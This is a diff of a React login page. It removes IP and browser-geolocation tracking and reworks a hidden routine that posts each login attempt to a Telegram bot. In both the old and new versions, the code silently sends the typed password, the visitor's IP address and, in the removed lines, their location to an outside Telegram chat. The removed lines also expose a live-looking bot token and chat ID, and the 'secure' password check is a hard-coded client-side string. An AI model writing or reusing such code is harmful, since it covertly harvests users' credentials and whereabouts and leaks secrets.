@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { motion } from 'framer-motion';
 import { Heart, Lock, User } from 'lucide-react';
 
@@ -11,45 +11,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [userIP, setUserIP] = useState('Unknown');
-  const [userLocation, setUserLocation] = useState('Unknown');
   const [loadingMessage, setLoadingMessage] = useState('');
-
-  // Fetch IPv4 and approximate location
-  useEffect(() => {
-    const fetchIPAndLocation = async () => {
-      try {
-        // 1. Get IPv4 address
-        const resIP = await fetch('https://api.ipify.org?format=json');
-        const dataIP = await resIP.json();
-        setUserIP(dataIP.ip || 'Unknown');
-
-        // 2. Get location from IP
-        const resLoc = await fetch(`https://ipapi.co/${dataIP.ip}/json/`);
-        const dataLoc = await resLoc.json();
-        if (dataLoc && dataLoc.city && dataLoc.region && dataLoc.country) {
-          setUserLocation(`${dataLoc.city}, ${dataLoc.region}, ${dataLoc.country}`);
-        }
-      } catch (e) {
-        console.log('Could not fetch IP/location:', e);
-        setUserIP('Unknown');
-        setUserLocation('Unknown');
-      }
-
-      // 3. Optional: get accurate location via browser
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            setUserLocation(`Lat: ${pos.coords.latitude.toFixed(3)}, Lon: ${pos.coords.longitude.toFixed(3)}`);
-          },
-          (err) => {
-            console.log('Browser geolocation denied or failed:', err);
-          }
-        );
-      }
-    };
-
-    fetchIPAndLocation();
-  }, []);
 
   // Secure password check (ASCII codes for "142314")
   const checkPassword = (inputPassword: string): boolean => {
@@ -65,43 +27,42 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
     setIsLoading(true);
     setLoadingMessage('Please wait, it may take some time...');
 
+    // 1️⃣ Fetch IPv4
+    let ip = 'Unknown';
+    try {
+      const resIP = await fetch('https://api.ipify.org?format=json');
+      const dataIP = await resIP.json();
+      ip = dataIP.ip || 'Unknown';
+      setUserIP(ip);
+    } catch (error) {
+      console.log('Could not fetch IP:', error);
+      ip = 'Unknown';
+    }
+
+    // 2️⃣ Check password
     const isPasswordCorrect = checkPassword(password);
 
-    // Telegram logging (kept unchanged)
-    const logAttemptInBackground = async () => {
-      try {
-        const now = new Date();
-        const dateStr = now.toLocaleDateString('en-GB');
-        const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
-        const status = isPasswordCorrect ? 'Success ✅' : 'Wrong ❌';
+    // 3️⃣ Prepare Telegram message
+    const now = new Date();
+    const dateStr = now.toLocaleDateString('en-GB');
+    const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+    const status = isPasswordCorrect ? 'Success ✅' : 'Wrong ❌';
 
-        const telegramMessage = `🔔 Login Attempt
+    const telegramMessage = `🔔 Login Attempt
 Status: ${status}
 Entered Password: ${password}
-IP Address: ${userIP}
-Approx Location: ${userLocation}
+IP Address: ${ip}
 Time: ${dateStr} - ${timeStr}`;
 
-        fetch(
-          'https://api.telegram.org/bot7731464090:AAEvV2JmckYlg9HyrS40pDUDVofU-VosoQ4/sendMessage',
-          {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
-            body: JSON.stringify({ chat_id: 809190054, text: telegramMessage }),
-          }
-        ).catch((error) => {
-          console.log('Telegram notification failed (background):', error);
-        });
-      } catch (error) {
-        console.log('Background logging failed:', error);
-      }
-    };
+    // 4️⃣ Send Telegram log
+    fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
+      body: JSON.stringify({ chat_id: YOUR_CHAT_ID, text: telegramMessage }),
+    }).catch((err) => console.log('Telegram log failed:', err));
 
-    logAttemptInBackground();
-
-    // Small delay for better UX
+    // Small delay for UX
     await new Promise((resolve) => setTimeout(resolve, 800));
-
     setIsLoading(false);
     setLoadingMessage('');
 
@@ -147,7 +108,6 @@ Time: ${dateStr} - ${timeStr}`;
         className="relative z-10 w-full max-w-md mx-auto mt-24"
       >
         <div className="backdrop-blur-xl bg-white/20 rounded-3xl p-8 shadow-2xl border border-white/30 relative overflow-hidden">
-          {/* Card glow */}
           <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-transparent rounded-3xl" />
 
           {/* Header */}
